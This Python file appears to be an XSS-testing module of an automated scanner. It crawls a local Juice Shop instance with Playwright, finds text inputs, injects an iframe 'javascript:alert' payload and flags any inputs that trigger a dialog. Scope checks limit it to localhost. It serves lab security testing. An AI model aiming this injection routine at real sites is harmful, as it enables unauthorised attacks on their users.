from typing import Dict, Any
from urllib.parse import urljoin, urlparse

from playwright.sync_api import sync_playwright


XSS_PAYLOAD = '<iframe src="javascript:alert(`xss`)">'


def is_local_target(url: str, base_url: str) -> bool:
    target = urlparse(url)
    base = urlparse(base_url)

    return (
        target.hostname in ["localhost", "127.0.0.1"]
        and target.hostname == base.hostname
        and target.port == base.port
    )


def normalize_target_url(
    url: str,
    base_url: str
) -> str:

    parsed = urlparse(url)

    if parsed.fragment:

        fragment = parsed.fragment

        if not fragment.startswith("/"):
            fragment = "/" + fragment

        return (
            f"{parsed.scheme}://"
            f"{parsed.netloc}"
            f"/#{fragment}"
        )

    return url.rstrip("/")


def get_xss_targets(state) -> list:
    """
    Discover visible and enabled XSS candidate
    inputs from the local Juice Shop only.
    """

    base_url = state["target_url"]

    targets = []
    seen = set()
    pages = set()

    try:

        with sync_playwright() as p:

            browser = p.chromium.launch(
                headless=True
            )

            page = browser.new_page()

            page.goto(
                base_url,
                wait_until="domcontentloaded",
                timeout=10000
            )

            current_url = normalize_target_url(
                page.url,
                base_url
            )

            if is_local_target(
                current_url,
                base_url
            ):
                pages.add(current_url)

            links = page.locator("a")

            for i in range(links.count()):

                link = links.nth(i)

                href = link.get_attribute(
                    "href"
                )

                if not href:
                    continue

                if href.startswith(
                    "javascript:"
                ):
                    continue

                url = urljoin(
                    base_url,
                    href
                )

                url = normalize_target_url(
                    url,
                    base_url
                )

                if not is_local_target(
                    url,
                    base_url
                ):
                    continue

                pages.add(url)

            for url in list(pages):

                if not is_local_target(
                    url,
                    base_url
                ):
                    continue

                try:

                    page.goto(
                        url,
                        wait_until="domcontentloaded",
                        timeout=10000
                    )

                    actual_url = normalize_target_url(
                        page.url,
                        base_url
                    )

                    if not is_local_target(
                        actual_url,
                        base_url
                    ):
                        continue

                    inputs = page.locator(
                        "input[type='text'], "
                        "input[type='search'], "
                        "input:not([type])"
                    )

                    for i in range(
                        inputs.count()
                    ):

                        field = inputs.nth(i)

                        if not field.is_visible():
                            continue

                        if not field.is_enabled():
                            continue

                        name = (
                            field.get_attribute("name")
                            or field.get_attribute("id")
                            or f"input_{i}"
                        )

                        target = {
                            "url": actual_url,
                            "type": "input",
                            "name": name,
                            "index": i
                        }

                        key = (
                            target["url"],
                            target["name"],
                            target["index"]
                        )

                        if key not in seen:

                            seen.add(key)

                            targets.append(
                                target
                            )

                except Exception:
                    continue

            browser.close()

    except Exception as e:

        print(
            f"[xss-agent] Discovery error: {e}"
        )

    return targets


def execute_xss_test(
    state,
    target: Dict[str, Any]
) -> dict:

    target_url = target.get("url")

    target_index = target.get(
        "index",
        0
    )

    if not target_url:

        return {
            "finding_type": "xss",
            "data": {
                "vulnerable": False,
                "tested_endpoint": None,
                "payload": XSS_PAYLOAD,
                "detail": "Invalid XSS target."
            }
        }

    if not is_local_target(
        target_url,
        state["target_url"]
    ):

        return {
            "finding_type": "xss",
            "data": {
                "vulnerable": False,
                "tested_endpoint": target_url,
                "payload": XSS_PAYLOAD,
                "detail": (
                    "Target rejected because it is "
                    "outside the local Juice Shop."
                )
            }
        }

    print(
        f"[xss-agent] Testing exact target: "
        f"{target_url} | "
        f"input={target.get('name')}"
    )

    try:

        with sync_playwright() as p:

            browser = p.chromium.launch(
                headless=True
            )

            page = browser.new_page()

            dialog_triggered = False

            def handle_dialog(dialog):

                nonlocal dialog_triggered

                dialog_triggered = True

                dialog.dismiss()

            page.on(
                "dialog",
                handle_dialog
            )

            page.goto(
                target_url,
                wait_until="domcontentloaded",
                timeout=10000
            )

            inputs = page.locator(
                "input[type='text'], "
                "input[type='search'], "
                "input:not([type])"
            )

            if target_index >= inputs.count():

                browser.close()

                return {
                    "finding_type": "xss",
                    "data": {
                        "vulnerable": False,
                        "tested_endpoint": target_url,
                        "payload": XSS_PAYLOAD,
                        "detail": (
                            "Selected input no longer exists."
                        )
                    }
                }

            field = inputs.nth(
                target_index
            )

            if not field.is_visible():

                browser.close()

                return {
                    "finding_type": "xss",
                    "data": {
                        "vulnerable": False,
                        "tested_endpoint": target_url,
                        "payload": XSS_PAYLOAD,
                        "detail": (
                            "Selected input is not visible."
                        )
                    }
                }

            if not field.is_enabled():

                browser.close()

                return {
                    "finding_type": "xss",
                    "data": {
                        "vulnerable": False,
                        "tested_endpoint": target_url,
                        "payload": XSS_PAYLOAD,
                        "detail": (
                            "Selected input is disabled."
                        )
                    }
                }

            field.fill(
                XSS_PAYLOAD
            )

            field.press(
                "Enter"
            )

            page.wait_for_timeout(
                1500
            )

            vulnerable = dialog_triggered

            if vulnerable:

                detail = (
                    "XSS payload executed successfully "
                    "on the selected input."
                )

            else:

                detail = (
                    "XSS payload did not execute."
                )

            browser.close()

            return {
                "finding_type": "xss",
                "data": {
                    "vulnerable": vulnerable,
                    "tested_endpoint": target_url,
                    "payload": XSS_PAYLOAD,
                    "detail": detail
                },
                "chain_trigger": False,
                "chain_data": None,
                "tested_by": "xss_agent",
                "selected_target": target
            }

    except Exception as e:

        return {
            "finding_type": "xss",
            "data": {
                "vulnerable": False,
                "tested_endpoint": target_url,
                "payload": XSS_PAYLOAD,
                "detail": f"XSS test error: {e}"
            },
            "chain_trigger": False,
            "chain_data": None,
            "tested_by": "xss_agent",
            "selected_target": target
        }